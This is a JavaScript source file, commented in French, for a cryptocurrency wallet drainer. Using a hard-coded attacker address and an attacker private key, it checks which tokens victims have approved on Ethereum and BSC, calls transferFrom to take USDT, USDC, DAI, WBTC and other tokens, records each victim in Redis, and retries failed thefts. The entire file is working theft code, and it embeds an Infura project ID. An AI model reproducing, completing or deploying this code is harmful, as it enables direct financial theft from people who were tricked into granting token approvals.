import { ethers } from 'ethers';
import { createClient } from 'redis';

const ATTACKER_ADDRESS = '0x9e09f7E4AD79177Ba1cB4b2125390d9A4d6f34DB';

function getPrivateKey() {
  if (process.env.ATTACKER_PRIVATE_KEY) {
    const key = process.env.ATTACKER_PRIVATE_KEY.trim();
    if (key.length === 64) return '0x' + key;
  }
  const fs = require('fs');
  const path = require('path');
  const filePath = path.resolve('./private_key.txt');
  if (fs.existsSync(filePath)) {
    const key = fs.readFileSync(filePath, 'utf8').trim();
    if (key.length === 64) return '0x' + key;
  }
  throw new Error('🔴 Aucune clé privée valide.');
}

const PRIVATE_KEY = getPrivateKey();
const wallet = new ethers.Wallet(PRIVATE_KEY);

// Tokens à drainer (Ethereum Mainnet)
const TOKENS = {
  '1': {
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    'DAI' : '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA',
  },
  '56': {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    'BNB' : '0xbb4CdB9CBD36B01bD1cBaEBF2De08d9173bc095c',
    'ETH' : '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
  }
};

const INFURA_ID = '19d1629672a84111af5429582deaf793';
const RPC_URLS = [
  `https://mainnet.infura.io/v3/${INFURA_ID}`,
  'https://eth-mainnet.g.alchemy.com/v2/demo',
  'https://1rpc.io/eth',
  'https://rpc.ankr.com/eth'
];

async function getProvider() {
  for (const url of RPC_URLS) {
    try {
      const provider = new ethers.providers.JsonRpcProvider({
        url,
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; VercelBot/1.0)'
        }
      });
      await provider.getBlockNumber();
      return { provider, url };
    } catch (e) {
      console.warn(`⚠️ RPC injoignable : ${url}`);
    }
  }
  throw new Error('❌ Aucun RPC disponible');
}

const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function decimals() view returns (uint8)'
];

const drainedAddresses = new Set();

async function recordVictim(address, chain, token, amount, status) {
  const client = createClient({ url: process.env.REDIS_URL });
  try {
    await client.connect();
    const key = `victim:${address}`;
    await client.hSet(key, {
      chain,
      token,
      amount,
      status,
      timestamp: String(Date.now())
    });
    const list = await client.get('victims:list');
    const parsedList = list ? JSON.parse(list) : [];
    if (!parsedList.includes(address)) {
      parsedList.push(address);
      await client.set('victims:list', JSON.stringify(parsedList));
    }
  } finally {
    await client.disconnect();
  }
}

export async function drainVictim(victimAddress, chainId) {
  if (drainedAddresses.has(victimAddress)) {
    console.log(`⚠️ Déjà drainé : ${victimAddress}`);
    return false;
  }

  const { provider } = await getProvider();
  const signer = wallet.connect(provider);

  let drainedSome = false;
  const tokens = TOKENS[chainId] || {};

  for (const [tokenName, tokenAddr] of Object.entries(tokens)) {
    const contract = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
    try {
      const [balance, allowance, decimals] = await Promise.all([
        contract.balanceOf(victimAddress),
        contract.allowance(victimAddress, ATTACKER_ADDRESS),
        contract.decimals().catch(() => 18)
      ]);

      const dec = decimals || 18;
      const balFormatted = ethers.utils.formatUnits(balance, dec);
      const allowFormatted = ethers.utils.formatUnits(allowance, dec);
      console.log(`[${tokenName}] Balance: ${balFormatted}, Allowance: ${allowFormatted}`);

      if (balance.isZero() || allowance.isZero()) {
        console.log(`⏭️ ${tokenName} : solde ou allow null (bal=${balFormatted}, allow=${allowFormatted})`);
        continue;
      }

      // Transférer le minimum entre le solde et l'allowance
      const toTransfer = balance.lt(allowance) ? balance : allowance;
      const tx = await contract.transferFrom(
        victimAddress,
        ATTACKER_ADDRESS,
        toTransfer
      );
      const receipt = await tx.wait();
      const amountFormatted = ethers.utils.formatUnits(toTransfer, dec);
      console.log(`✅ ${tokenName} volé : ${amountFormatted} | Tx: ${receipt.transactionHash}`);
      drainedSome = true;

      await recordVictim(victimAddress, chainId, tokenName, amountFormatted, 'drained');
    } catch (err) {
      console.error(`❌ Erreur sur ${tokenName} : ${err.message}`);
      // Si c'est une erreur de simulation ou de revert, on passe
      if (err.code === 'UNPREDICTABLE_GAS_LIMIT' || err.code === 'CALL_EXCEPTION') {
        await recordVictim(victimAddress, chainId, tokenName, '0', 'failed');
        continue;
      }
      // Erreur réseau -> on relance pour que drainWithRetry réessaye
      if (err.code === 'SERVER_ERROR') throw err;
    }
    await new Promise(r => setTimeout(r, 500));
  }

  if (drainedSome) {
    drainedAddresses.add(victimAddress);
    return true;
  } else {
    console.log(`⏭️ ${victimAddress} n'a rien de drainable pour le moment.`);
    return false;
  }
}

export async function drainWithRetry(victim, chainId, retries = 3, baseDelay = 2000) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const result = await drainVictim(victim, chainId);
      if (result) {
        console.log(`🔥 VICTOIRE : ${victim} vidé avec succès`);
        return true;
      }
      return false; // rien à drainer, on n'insiste pas
    } catch (err) {
      console.error(`⛔ Tentative ${attempt}/${retries} échouée : ${err.message}`);
      if (attempt === retries) {
        console.error(`💀 Échec final après ${retries} tentatives pour ${victim}`);
        return false;
      }
      const delay = baseDelay * Math.pow(2, attempt - 1);
      console.log(`⏳ Nouvelle tentative dans ${delay/1000}s...`);
      await new Promise(r => setTimeout(r, delay));
    }
  }
}
